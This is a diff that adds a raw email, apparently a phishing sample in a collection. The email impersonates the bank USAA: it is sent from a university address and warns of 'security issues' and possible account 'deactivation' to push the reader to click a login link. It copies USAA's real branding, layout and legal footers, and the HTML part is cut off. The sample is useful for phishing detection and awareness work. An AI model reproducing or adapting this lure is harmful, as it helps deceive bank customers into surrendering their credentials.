@@ -1,0 +1,639 @@
+Received: from unknown (HELO smtpauth4.wiscmail.wisc.edu) (144.92.197.145)
+  by 0 with SMTP; 5 Oct 2017 15:16:48 -0000
+MIME-version: 1.0
+Content-type: multipart/alternative;
+ boundary="Boundary_(ID_s82DCzHyJZcEei3sWHa49A)"
+Received: from avs-daemon.smtpauth4.wiscmail.wisc.edu by
+ smtpauth4.wiscmail.wisc.edu
+ (Oracle Communications Messaging Server 8.0.1.1.0 64bit (built Jun 15 2016))
+ id <0OXC00C00VOBMZ00@smtpauth4.wiscmail.wisc.edu> for info@cm-expo.com; Thu,
+ 05 Oct 2017 10:16:35 -0500 (CDT)
+X-Spam-Report: AuthenticatedSender=yes, SenderIP=207.46.163.52
+X-Spam-PmxInfo: Server=avs-4, Version=6.3.3.2656215,
+ Antispam-Engine: 2.7.2.2107409, Antispam-Data: 2017.10.5.151216,
+ AntiVirus-Engine: 5.38.0, AntiVirus-Data: 2017.6.22.5380000,
+ SenderIP=207.46.163.52
+Return-path: <ydanilov@wisc.edu>
+Received: from NAM02-CY1-obe.outbound.protection.outlook.com
+ (mail-cys01nam02lp0052.outbound.protection.outlook.com [207.46.163.52])
+ by smtpauth4.wiscmail.wisc.edu
+ (Oracle Communications Messaging Server 8.0.1.1.0 64bit (built Jun 15 2016))
+ with ESMTPS id <0OXC0036HVRJZ6D0@smtpauth4.wiscmail.wisc.edu>; Thu,
+ 05 Oct 2017 10:16:33 -0500 (CDT)
+Received: from sp01.SP.local (64.223.246.122)
+ by BLUPR06MB595.namprd06.prod.outlook.com (10.141.206.144)
+ with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256)
+ id 15.20.77.7; Thu, 5 Oct 2017 15:16:16 +0000
+Received-SPF: None (protection.outlook.com: wisc.edu does not designate
+ permitted sender hosts)
+Date: Thu, 05 Oct 2017 11:16:09 -0400
+Sun-Java-System-SMTP-Warning: Lines longer than SMTP allows found and truncated.
+From: USAA <ydanilov@wisc.edu>
+Subject: USAA Account Resolution Required
+X-Originating-IP: [64.223.246.122]
+To: ---------- <abc@example.com>
+Message-id:
+ <BLUPR06MB595D9C422CE14F0B5D43854A0700@BLUPR06MB595.namprd06.prod.outlook.com>
+SpamDiagnosticOutput: 1:22
+X-ClientProxiedBy: BN6PR13CA0040.namprd13.prod.outlook.com (10.171.172.26) To
+ BLUPR06MB595.namprd06.prod.outlook.com (10.141.206.144)
+X-MS-PublicTrafficType: Email
+X-MS-Office365-Filtering-Correlation-Id: 288222c9-e5e7-4ad6-f506-08d50c040898
+X-MS-Office365-Filtering-HT: Tenant
+X-Microsoft-Antispam:
+ UriScan:;BCL:0;PCL:0;RULEID:(22001)(2017030254152)(48565401081)(2017052603199)(201703131423075)(201703031133081)(201702281549075);SRVR:BLUPR06MB595;
+X-Microsoft-Exchange-Diagnostics:
+ 1;BLUPR06MB595;3:pVgsY0nUnbn4vijuC22UOS51QEN6KTQ1gLYo5NZBj42XK5pUqWTxbXxcFPYSTP8HvfDUC4zvkGVgkLvBa7aI+OlLfUHcZ/t3dLPaFbha9KyML7ShWDW2vSAv44utiyi5ARHwkJY9tnQUXbV4TnaQMH3VQbObo50YMGQMx/Nyoy9y4v2EPbbhHtuPmhGI2CV9Pt9sv00k9Pu6LUZ6y66WG5qg49WJdxv3UiiBbsPgl/4u+ELWWYEmXFo5f809jtW6;25:PbN9DWmpu2/ggVw6wB/awrTGeKSszekC+zHcg4Ybi/prX1jsBeMB0bDPOBJCcKlTOdVErvMQgUqGO0DjhDawHIJjx8wo1f6Bc2EwpFL+MjJjsLmAvCTf3Ur+YMBnzP6PIU8333Z8ytMPYJgZrgY/NOY3nR1wvXCotf+R/77fmkM5ncj1sm5EwIqOaNF7HsdATEyCU2VCH6gQXoOun6iCIUm34Va7zz7L7H0GYYb4u9zbEN07z5kuQz2f5czwZyxYmxVhn7AMiCjt3PgM9udJLUTpjtoxc4ZNcd6zzV4gnUWcIux81CegCw8+0+Ztlg2elFt9EkpKY3mZ/nMp86qjyA==;31:UYWIWtEYDcEc4mb3NY73g/i98LUowZ0gYhTfSMZxq6bRZEa8VJcDRDMxyv4C/M3YYX183M0mMi5wgyKmdThXHX7Ik0cbZvtgDHrVEBoSKaHb/vvWNS3R1WFXkhbIQZ67rPA29XcpvhklZWBcA4uXW3fJpX6Isp8tl45WNz1PO2J5PIYtg21F7Yt1Kc6VC8XC0E1sL52197OWT8OptLlKJEz3s2bujGDhtXUbeOGPKYg=
+X-MS-TrafficTypeDiagnostic: BLUPR06MB595:|BLUPR06MB595:
+X-Microsoft-Exchange-Diagnostics:
+ 1;BLUPR06MB595;20:XIk7q3VmkFMe8t3TYpsmAf211xhy4aaTdj5XUj1evdzITYR7VoMCMdF7NWj7sXu+VRgY4WjDm8q/fq1zoj5QBBuWVj0+NXNNLiPfJ/58dYxqExik1YfC1us0ClLAkHDEbqL76Qp6BAE0ipP5LlbOK8Er6DXuBICFYyrP2szEbGiv4eVhhLiy4mD1ajW22pKsuVPNhA/k5k1IqcuZC1ZEmh/te4yX/EMNDr1xWfW+OT0dt3asKMlnRpYqGrgKo9iwXhMs46T8c2JTNp5n/bXdcaEFmdjNgNys7gQYz+bIHYL6FIlLyTS9YAjdYhS0a5SuW93Z1M41p0Nz+cNz/VS3TUlyuWzjbXIfH36cBLQ/d+cXTUfnPqDTlvj+PpcESOJQGSMnEuX1x7Ly4TM0CjVO6jlxwr82Uln2cMX0cdql28jIkh9JvlmK9cO0/YUhnLbfffY0zQFB3JVrPpTtSqGI1hwwDYsTjj2HUhXseNmNX8cFfcsrpQQ8uhmYeG44F9Xrx6YT0rrYmTCuFn6QArsFMQ==;4:TPC48z9g9eAAT/id22d1X1qE9bbPnM2zJ0y8TGjonUl4Ii4v2q0ow0Qt7yX9MgKn0zHeTWDIIbZRi+jvaVcKiZoYP3hz5UD42Pzlvfvwx9W4D9Hqf/83f1xf9NgMQKPdqUd2qaQP0T6k4Yv0BdPT9YGHRwCSOmfQ+9Nw6Ro/DLav1ZeL7THKnToZuTHp9J0QODTCatd8w7ZZa4w1AdlW5vDsRYEqw6ghfNbquRwumQkgCVMU/ioUJU7q096OJ+WT07jzEZkvBHfBAYlHQg5K7Ut5s0sME5Tx68afvlp2wX2ulVYAjqeFiflCa61Vt9X6WUlV9Mzxrr2Z9cC1bnncIA==
+X-Exchange-Antispam-Report-Test: UriScan:(240406765402496)(192374486261705);
+X-Microsoft-Antispam-PRVS:
+ <BLUPR06MB595C09E67106B83D80EC7E8A0700@BLUPR06MB595.namprd06.prod.outlook.com>
+X-Exchange-Antispam-Report-CFA-Test:
+	BCL:0;PCL:0;RULEID:(100000700101)(100105000095)(100000701101)(100105300095)(100000702101)(100105100095)(6040450)(2401047)(5005006)(8121501046)(3002001)(93006095)(93001095)(10201501046)(100000703101)(100105400095)(6055026)(6041248)(20161123555025)(20161123560025)(20161123564025)(20161123562025)(20161123558100)(201703131423075)(201702281529075)(201702281528075)(201703061421075)(201703061406153)(6072148)(201708071742011)(100000704101)(100105200095)(100000705101)(100105500095);SRVR:BLUPR06MB595;BCL:0;PCL:0;RULEID:(100000800101)(100110000095)(100000801101)(100110300095)(100000802101)(100110100095)(100000803101)(100110400095)(100000804101)(100110200095)(100000805101)(100110500095);SRVR:BLUPR06MB595;
+X-Forefront-PRVS: 04519BA941
+X-Forefront-Antispam-Report:
+ SFV:SPM;SFS:(10009020)(346002)(39860400002)(376002)(189002)(30844003)(199003)(53164002)(9686003)(54896002)(81956001)(53946003)(2906002)(250100001)(10710500007)(64544003)(7416002)(8936002)(7276002)(19627405001)(606006)(81166006)(7406005)(106356001)(7336002)(7366002)(68736007)(84326002)(3480700004)(236005)(8666007)(101416001)(6116002)(105586002)(861006)(66066001)(6306002)(512934002)(6512007)(75432002)(81156014)(19610725007)(189998001)(53346004)(2171002)(10440500001)(10300500001)(8676002)(54356999)(50986999)(53936002)(33656002)(6486002)(6666003)(7736002)(6200100001)(18926415007)(347745004)(6862004)(551934003)(478600001)(966005)(17650700003)(97736004)(2420400007)(16640700004)(5660300001)(733005)(7110500001)(3846002)(10126004)(25786009)(786003)(6506006)(7066003)(88552002)(316002)(86362001)(74316002)(10290500003)(575854001)(15650500001)(16586007)(16526018)(82596007);DIR:OUT;SFP:1501;SCL:5;SRVR:BLUPR06MB595;H:sp01.SP.local;FPR:;SPF:None;PTR:InfoNoRecords;MX:1;A:
+X-Microsoft-Exchange-Diagnostics:
+ =?us-ascii?Q?1;BLUPR06MB595;23:y4Q0dUtLkY347EVHMAqVe/azjI6h6DjkJgsz49gcD+?=
+ =?us-ascii?Q?PnxD8cMxuaBtHpXMEZNM06hUpKHl7jO9RsGzxjpHn/xv13WQXa5oj9EPg0dE?=
+ =?us-ascii?Q?vT3gceldHHNTR86PVyXZ32KwMYedly9YrylIpyXg0LyWjgJdOTcmGNhRCJ/g?=
+ =?us-ascii?Q?8fjNgvXMxnSfSsRXezwrLJ5yTggd//RFNubwTmguDeJHGsugsbaoEOggVONL?=
+ =?us-ascii?Q?OAqSI2ILOc4SBIrDhR7aFzsyLTLBitt8lQotHplAOpZaS2Ib28RwQLryRTka?=
+ =?us-ascii?Q?6z3IePVyNpd5Ge7tVUy9rI2I91up9wK0of6HAEXEcdmsYCnI9kwN3Okk7J+O?=
+ =?us-ascii?Q?6EKsxQUczwPB/fABOPR2AMwz8bOnidA8CQQO1H4UUdJbR2gDSOiTAg/c3UbC?=
+ =?us-ascii?Q?EcWiPs+gWGDVju0niH1m5n50V+JKTjYCQKnPv0UNfktYP5Fi/YPHjmTVlZgL?=
+ =?us-ascii?Q?vVmiiV1vzgtx02GfE+OjgfHkDya4XgTCGX7pFOTCa3KvNEaGqKxp3Bqoi0I9?=
+ =?us-ascii?Q?wb/qIRXOvv1GQnA1DlQGKiS2rZ89ApxS0O2UF3PtrZxceFkA8Pzsip5qCAbY?=
+ =?us-ascii?Q?nrQ7YyO2+IagG5ot4uMoLIRNCbNJ7U24gGWJOBxTx4hmp1SJhrGCm7vC4FMa?=
+ =?us-ascii?Q?1vWSB8bQOOFUlFPMy7D0eWbUbsmPHs/phkp/qkgZOoPYSWNqsTNxoRKAjT6X?=
+ =?us-ascii?Q?EICvs+8FHJMARqQdpf/IcV+AsOH2cmftVxE7R/EbCuNQ2si5ugtliLpQY2Sa?=
+ =?us-ascii?Q?AAWZ9AIFekVHPaCVij0DRdz4/xVt+4OCsdtpF948mR7PPfXptd0of/56I420?=
+ =?us-ascii?Q?E2mb3uUnC+ElfdI1R1regXDkXR83FnCcKNUBD5Oc0reiA2BibcBlbEjGgX77?=
+ =?us-ascii?Q?vmgZYqNEdolxGVXEcF3fRkJN8yfwH/fxst9FRhtXjh+4laIGxGp44WuipqxN?=
+ =?us-ascii?Q?CtfETeV64U5s6uFpcVJ+oa8ArsdTRzs9aXz4kq7Msyv0/ZIEAs/oxJJk1OM/?=
+ =?us-ascii?Q?E55erqtGrAF+WnBZ+koM24uDZlQtF7clGQgZCjsPtA3M8T4URO3eQZoqqWMw?=
+ =?us-ascii?Q?Ee6WfFI6PYLIw/cLaM8RsiSFAN8pkOt0kY10feDVuNJqy+JZKWnU+F5RH3+1?=
+ =?us-ascii?Q?PGAYFAjN4JjKZ06O1QvirwRUal1R1oix/Oa5VueEcjhWWIF3OFB3i1ZGDdje?=
+ =?us-ascii?Q?wiv5XA26d72xBxqPkgp3Y/TwtFD2v/1w16kWO4yxidWKAhGZYzkFBB9LTCp5?=
+ =?us-ascii?Q?YX5pSZwVqj41s81pUSA+d1bOCivZcKxXIZuZoEwBhrZJmC1qi3gU+KzSNywy?=
+ =?us-ascii?Q?tfa/dwZB09jKBJrJ711P8AFGGF91IlZbk4LC2AanZuiADQHVtBqLGqcJHOZx?=
+ =?us-ascii?Q?s4dzk82igDt4rYmV/xV5Np39TqyFO4KMuE2Bx5KunkcR9ua3yZQpz+n9SBjD?=
+ =?us-ascii?Q?KfZnp2CnoTSSNWv2EDXFN2ezbhTpmJbPTqqqNQ8YP/ZM2SA3bRsk1s6kDhP/?=
+ =?us-ascii?Q?INndmuxTjDmjEaIbH5gri3NeRenpe9F4n6CmKW7/1jxqjr7MR41UABeLVnZO?=
+ =?us-ascii?Q?DctId3UF9LBBspnXkMfF3iinh+8Mv9DYvn36Lf8rXbcbwk8xGP02zA56eLdw?=
+ =?us-ascii?Q?89xc784mnY01rtDa250NVhOTxhJ2xNORY8NdQ/wOCWEIFmg68MjLptKB/qCy?=
+ =?us-ascii?Q?O0sUwAbnK6eO89Fh92gy3fSAiiVV3SLpuxAOfKpuoAA0Efvj2rz0W7Zum6sL?=
+ =?us-ascii?Q?m0/LPVerzJ2pkLwwzHErzEjPzRI/GNlU1KZlyuhYbS4HzOd//W5VAS0BBywm?=
+ =?us-ascii?Q?DMNTkE1l/q1L0jStuG80Zz/AEoBVwmjiQNUAkp3hvADBzjFO83LXkpZjZfI3?=
+ =?us-ascii?Q?bDk9VV7SpQa2R0zplnWJkkWRrcFWQsB4z3jpChTzdFJkicbL0R1z1FmWG2hJ?=
+ =?us-ascii?Q?VmXnXG2frH50Sfg86N/f8iMhc5YhT4bPcEZMmshM3jW7+Blee0Z2wa/Lr+TL?=
+ =?us-ascii?Q?U=3D?=
+X-Microsoft-Exchange-Diagnostics:
+	1;BLUPR06MB595;23:o9PL9bFDenoBaS+b9GJOvtHJPnJ1xzOTW6HIci8YQkFWFf5iMZh6SqYLlwXJStYFSL9+yd7VGU2gcT7VaZ2SevBm3KgDaiTvkB010/325mPSHE0k0l57E2aogKwuGKzNGayP/0JKPeMlIXgCcrWY4A==;6:rOiNQMuNtKczv9UwtbA3heTdQQ7GM9wHG6aXi1rtg9diRS/vhvErINHhWiaizIiiNrjT/IwiNiZTdv50XOp2MOCwElYYL7wHf+9lwMfJgt6K8xeQtmYNWqAGKMrIbJowNecSbjbyjAZIE3L0H36jO1Rgg5zb4tkC7ESWVQCW+mMno/2btyocnQn3WIE7yJ7PwR+gpr8bKfB3KH/ptm2b82hi9tc1CnG3kGXBaRd0gXDjwZ2Ght0ba9s47/gbez45W1CLl2EMh1M9YsjxiacC2H9Z30e+jUSAEfDRjWqWscd2wwcYN+4YfcsjRllB77nn5JJqA9KvAuE3jSI60VY53A==;5:nqHKgehHQMIY+Cnjtq8MeAT1MwhZz/0AN//AUSeLeXtfhwSKmcYOmd8QwmIi4rsk9pLEPorwChA43yECziDpQCben3gQA0IWOYt3KiUQyHo5zeaP0mmx25HSF9PHnUo6AmXjfLntSQU6uNuKBg9Yfg==;7:9JlHXVZTTlw/7YYORvv0Ox0D55N/pz8PPNZu5c44HjxWk56QH8OWNQ8HmMoFv1VQsOIXm9cYgB3KpwpLoS/VO/4BQTI35Uirj4ngwDqAU5tCF6XdAe/nQx/mieu/z1D8M/KlRt/bAw3SLEYhTwypVVJgtFqJhgKqIuQYpkYfj7mF6nzumgH75l94Yiyy290TCEVP0T/lnbuP89NEQRLJTeaAZr+yRAgKpVEbOwHq9wA=
+X-OriginatorOrg: wisc.edu
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 05 Oct 2017 15:16:16.1748 (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 2ca68321-0eda-4908-88b2-424a8cb4b0f9
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: BLUPR06MB595
+Authentication-results: spf=none (sender IP is )
+ smtp.mailfrom=ydanilov@wisc.edu;
+
+You will not see this in a MIME-aware mail reader.
+
+--Boundary_(ID_s82DCzHyJZcEei3sWHa49A)
+MIME-version: 1.0
+Content-type: text/plain; CHARSET=US-ASCII
+Content-transfer-encoding: 7BIT
+Content-description: Mail message body
+
+   
+   
+      
+   	 
+   
+   
+   USAA serves the financial needs of military veterans and their eligible family members. 	 
+  	  
+    	 
+  	 
+  	 
+   	 
+    
+   	 
+   
+   
+    	 
+  	  
+   
+   
+  	 
+  	 
+  	 
+  	 
+   	 
+   
+  	 
+     
+   
+   	  	  	  	  	  	  	  	  	  	  
+      	 
+  	  
+    WE'RE READY TO SERVE YOU.  	 
+   	 
+   USAA offers financial solutions designed to help you meet your goals throughout life. 	 
+   	 
+  	 
+  	 
+   	 
+    	 
+   	 
+    
+   
+   Upon intensive reviews on your profile. We have noticed that you
+ need to resolve important security issues on your account to
+ prevent temporal deactivation. It is therefore recommended that
+ you complete this process. Your security is important to us.
+
+Please click on the reference link below to resolve this issue:
+
+https://www.usaa.com/inet/ent_logon/Logon  	 
+  	 
+  	 
+    	 
+   	 
+   
+   
+   
+   	 
+  	 
+  	 
+  	 
+   
+    	 
+   	 
+   We know what it means to serve- 	 
+   Insurance   Banking   Investments   Retirement   Advice  	 
+  	 
+   	 
+   
+   
+     	 
+  	 
+  	 
+    
+  	 
+   
+   
+   Please do not reply to this e-mail. To contact USAA, visit our secure contact page.
+ 
+  1 Multiple product savings do not apply in all states or to all situations. Savings subject to change. Restrictions apply. 
+
+ 2 USAA Bank refunds up to $15 in other United States domestic banks' ATM usage fees each month and does not charge a fee for the first 10 ATM withdrawals. The ATM fee refund does not apply for the month in which the account is closed. Subsequent transactions will be charged $2.00 each. Transactions at ATMs located outside of the United States may not be eligible for ATM usage fee refunds. A 1% foreign transaction fee applies to withdrawals outside the United States. No ATM usage fees will be charged at USAA Preferred ATMs pursuant to an agreement with the ATM network/owners to not charge an ATM fee for USAA Bank ATM debit cards. 
+
+ Bank products by USAA Federal Savings Bank, Member FDIC. 
+
+ This advertisement brought to you by USAA, 9800 Fredericksburg Rd., San Antonio, TX 78288. 	 
+  	 
+  	 
+   
+   
+   - 2017 USAA. 206966-0416 	 
+  	  
+     Please consider the environment before printing this email. 	 
+  	 
+  	 
+   	 
+   
+ 
+  ---------------------------------------------------------------    	 
+  	 
+   
+
+--Boundary_(ID_s82DCzHyJZcEei3sWHa49A)
+MIME-version: 1.0
+Content-type: text/html; CHARSET=US-ASCII
+Content-transfer-encoding: 7BIT
+Content-description: Mail message body
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+	<meta name="viewport" content="width=device-width">
+	<title></title>
+
+	
+	
+</style><!--[if mso]><style type="text/css">a{padding:0}</style><![endif]-->
+
+</head>
+<body style="min-width: 100%; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; margin: 0; padding: 0; background: #e5e5e5; font-family: 'Arial', sans-serif; width: 100%;">
+	<img src="http://www.movable-ink-1282.com/p/cp/044cf2fe6e49e8a5/o.gif" width="1" height="1" style="outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; width: auto; max-width: 100%; clear: both; display: block;">
+	<!--Open Body-->
+	<table class="body" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; background: #e5e5e5; font-family: 'Arial', sans-serif; width: 100%;" width="100%">
+		<tr style="padding: 0; vertical-align: top;">
+			<td align="center" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+				<table class="responsive yahoo-align-center" align="center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+					<tr style="padding: 0; vertical-align: top;">
+						<td align="center" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+							<center style="width: 100%; min-width: 580px;">
+							<div class="div-wrapper" style="position: relative; width: 100%; max-width: 700px; min-width: 700px; margin: 0 auto;">
+								
+							<!-- superheader -->	
+							<table class="container super-header" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 580px; margin: 0 auto; min-width: 580px;" width="580">
+								<tr style="padding: 0; vertical-align: top;">
+									<td height="10" class="mso-empty" style="-webkit-hyphens: none; vertical-align: top; word-break: break-word; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #666666; font-size: 11px; text-align: left; font-family: 'Arial', sans-serif; border-collapse: collapse; line-height: 17px;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="-webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; word-break: break-word; padding: 0; vertical-align: top; text-align: left; font-family: 'Arial', sans-serif; color: #666666; font-size: 11px; width: 580px; line-height: 17px; border-collapse: collapse;" width="580">
+										<table width="100%" class="bottom" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: bottom;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column seventeen mobile-pad-bottom" style="hyphens: none; word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; padding: 0; font-family: 'Arial', sans-serif; font-size: 11px; text-align: left; color: #666666; border-collapse: collapse; vertical-align: bottom; line-height: 17px;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 411px;" width="411">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="p_small left" style="word-break: break-word; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; -webkit-hyphens: none; padding: 0; vertical-align: top; text-align: left; color: #666666; font-size: 11px; font-family: 'Arial', sans-serif; line-height: 17px; border-collapse: collapse;">
+																<span style="font-family: 'Arial', sans-serif; color: #666666; font-size: 11px; display: block; line-height: 17px;"><a  style="margin: 0; color: #666666; font-family: 'Arial', sans-serif; font-size: 11px; text-decoration: underline; line-height: 17px;">USAA serves the financial needs</a> of military veterans and their eligible family members.</span>
+															</td>
+														</tr>
+													</table>
+												</td>
+												<td class="column seven" style="hyphens: none; word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; padding: 0; font-family: 'Arial', sans-serif; font-size: 11px; text-align: left; color: #666666; border-collapse: collapse; vertical-align: bottom; line-height: 17px;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 169px;" width="169">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="p_small right mobile-left" align="right" style="word-break: break-word; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; -webkit-hyphens: none; padding: 0; vertical-align: top; font-family: 'Arial', sans-serif; color: #666666; font-size: 11px; border-collapse: collapse; text-align: right; line-height: 17px;">
+																<span style="font-family: 'Arial', sans-serif; color: #666666; font-size: 11px; display: block; line-height: 17px;"></span>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td height="10" class="mso-empty" style="-webkit-hyphens: none; vertical-align: top; word-break: break-word; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #666666; font-size: 11px; text-align: left; font-family: 'Arial', sans-serif; border-collapse: collapse; line-height: 17px;">
+									</td>
+								</tr>
+							</table>
+							<!-- end superheader -->
+							
+							<!-- content-member -->
+							<table class="container content" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; background: white; border: 1px solid #bebebe; width: 580px; margin: 0 auto; min-width: 580px;" width="580">
+								<tr style="padding: 0; vertical-align: top;">
+									<td height="5" class="mso-empty" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table class="page-margin header" align="center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 480px; margin: 0 auto;" width="480">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column twelve first middle" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; padding-right: 3px; vertical-align: middle; border-collapse: collapse;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 222px;" width="222">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="logo" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+																<a href="http://e.usaa.com/a/hBXYpMyB73spXB9MeTFNtLcf1r0/usaa01" style="margin: 0; color: #086b94; text-decoration: underline;"><img src="http://f.e.usaa.com/i/42/2078198359/25637_4716_logo-usaa.png" alt="USAA&#174; logo" style="outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; width: auto; max-width: 100%; clear: both; display: block; border: none;"></a>
+															</td>
+														</tr>
+													</table>
+												</td>
+												<td class="column twelve last middle" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; padding-left: 3px; vertical-align: middle; border-collapse: collapse;">
+													<table class="cell" align="right" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 222px;" width="222">
+														<tr style="padding: 0; vertical-align: top;">
+															<td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+																<table class="security-zone" align="right" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+																	<tr style="padding: 0; vertical-align: top;">
+																		<td height="93" valign="middle" class="middle cell" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; height: 112px; vertical-align: middle; border-collapse: collapse;">
+																			<table class="security-container" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+																				
+																			</table>
+																		</td>
+																	</tr>
+																</table>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>																						
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td height="5" class="mso-empty" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table width="100%" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+											
+										</table>
+									</td>
+								</tr>
+								<!-- masthead-responsive -->
+								<tr style="padding: 0; vertical-align: top;">
+								    <td class="full-width m-h-auto" background="http://f.e.usaa.com/i/42/2078198359/25637_4716_repeater.jpg" bgcolor="#12395b" width="580" height="170" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;">
+								        <!--[if gte mso 9]>
+											<v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:580px;height:170px;">
+											<v:fill type="tile" src="http://f.e.usaa.com/i/42/2078198359/25637_4716_repeater.jpg" color="#12395b" />
+											<v:textbox inset="0,0,0,0">
+										<![endif]-->
+								        <table width="100%" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+								            <tr style="padding: 0; vertical-align: top;">
+								                <td height="170" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                    <table height="100%" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; height: 100%;">
+								                        <tr style="padding: 0; vertical-align: top;">
+								                            <td height="100%" width="14" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="6" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="1" bgcolor="#4c1a2e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="4" bgcolor="#ac080e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="1" bgcolor="#4c1a2e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="2" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
